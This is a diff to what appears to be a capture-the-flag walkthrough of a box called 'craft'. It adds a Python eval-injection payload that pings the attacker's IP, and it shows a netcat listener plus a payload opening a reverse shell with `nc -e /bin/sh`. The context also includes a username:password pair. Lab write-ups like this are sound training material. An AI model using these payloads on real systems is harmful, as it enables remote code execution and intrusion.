@@ -119,11 +119,13 @@ dinesh:4aUh0A8PbVjxgd
 
 ### Gaining Access
 
-Having downloaded the repo earlier, I can copy and modify the `tests.py` script locally and use it to exploit the `eval` vulnerability. Mark Bagget's talk mentioned earlier gave me an idea of how to attempt the exploit with the `__import__` function.
+Having downloaded the repo earlier, I can copy and modify the `tests.py` script locally and use it to exploit the `eval` vulnerability. Mark Bagget's talk mentioned earlier gave me an idea of how to attempt the exploit with the `__import__` function. Changing the value of `brew_dict['abv']` from `'.15'` to the below allowed me to ping myself from the craft box.
 
--code-
+```python
+brew_dict['abv'] = '__import__(\"os\").system(\"ping \-c 2 10.10.14.2\") # Works!!
+```
 
-The above code allowed me to ping myself from the craft box. Awesome! Now let's try a reverse shell. After trying a few things, I set up a netcat listner on port `10000/tcp` (`nc -nlvp 10000`) and fed the following to the `eval` function:
+Awesome! Now let's try a reverse shell. After trying a few things, I set up a netcat listner on port `10000/tcp` (`nc -nlvp 10000`) and fed the following to the `eval` function:
 
 ```python
 brew_dict['abv'] = '__import__(\"os\").system(\"nc 10.10.14.2 10000 \-e \/bin\/sh\") # Works! Limited reverse shell!!
